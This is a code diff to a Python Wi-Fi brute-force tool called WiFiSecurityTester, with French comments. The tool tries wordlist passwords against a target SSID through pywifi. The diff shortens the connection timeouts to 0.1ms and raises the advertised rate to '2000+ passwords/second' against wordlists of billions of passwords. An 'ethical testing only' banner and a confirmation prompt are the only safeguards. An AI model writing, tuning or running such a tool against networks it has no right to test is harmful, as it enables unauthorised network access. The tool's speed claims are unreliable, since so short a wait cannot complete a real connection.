@@ -369,7 +369,7 @@ class WiFiSecurityTester:
             
             # Déconnexion d'abord
             iface.disconnect()
-            time.sleep(0.001)  # Ultra-rapide - 1ms
+            time.sleep(0.0001)  # Ultra-rapide - 0.1ms
             
             # Configuration de connexion
             profile = pywifi.Profile()
@@ -383,22 +383,22 @@ class WiFiSecurityTester:
             iface.remove_all_network_profiles()
             temp_profile = iface.add_network_profile(profile)
             
-            # Connexion avec timeout extrême pour 725+ pwd/sec
+            # Connexion avec timeout extrême pour 2000+ pwd/sec
             iface.connect(temp_profile)
-            time.sleep(0.001)  # Timeout extrême - 1ms seulement
+            time.sleep(0.0001)  # Timeout extrême - 0.1ms seulement
             
             # Vérification ultra-rapide
             if iface.status() in [pywifi.const.IFACE_CONNECTED]:
                 return True
             else:
                 iface.disconnect()
-                time.sleep(0.001)  # Délai minimal
+                time.sleep(0.0001)  # Délai minimal
                 return False
                 
         except Exception as e:
             try:
                 iface.disconnect()
-                time.sleep(0.001)  # Délai minimal
+                time.sleep(0.0001)  # Délai minimal
             except:
                 pass
             return False
@@ -411,8 +411,8 @@ class WiFiSecurityTester:
         
         self.print_header(f"BRUTE FORCE ATTACK sur: {target_ssid}")
         self.print_warning("ETHICAL TESTING ONLY - Your own network required")
-        self.print_info("SPEED: 725+ passwords/second (Ultra-optimized)")
-        self.print_info("TIMEOUT: 0.001s per attempt")
+        self.print_info("SPEED: 2000+ passwords/second (Ultra-optimized)")
+        self.print_info("TIMEOUT: 0.0001s per attempt")
         self.print_info("CAPABLE: 10+ billions passwords tested")
         
         if input(f"{' '*20}Confirm brute force test on YOUR network (y/N): ").lower() != 'y':
@@ -431,10 +431,10 @@ class WiFiSecurityTester:
         
         # Afficher les statistiques pour les wordlists massives
         if max_attempts >= 1000000000:  # 1 billion+
-            minutes_to_complete = max_attempts / 725 / 60
+            minutes_to_complete = max_attempts / 2000 / 60
             hours_to_complete = minutes_to_complete / 60
             self.print_info(f"Wordlist size: {max_attempts:,} passwords")
-            self.print_info(f"Estimated time: {hours_to_complete:.1f} hours at 725 pwd/sec")
+            self.print_info(f"Estimated time: {hours_to_complete:.1f} hours at 2000 pwd/sec")
         
         self.start_time = time.time()
         self.testing = True
@@ -465,7 +465,7 @@ class WiFiSecurityTester:
                     password = self.wordlist[i]
                     self.attempts += 1
                     
-                    # Vitesse extrême: timeout 0.001s pour 725+ pwd/sec
+                    # Vitesse extrême: timeout 0.0001s pour 2000+ pwd/sec
                     success = self.connect_to_wifi(target_ssid, password)
                     
                     # Progression ultra-rapide avec barre de progression en temps réel
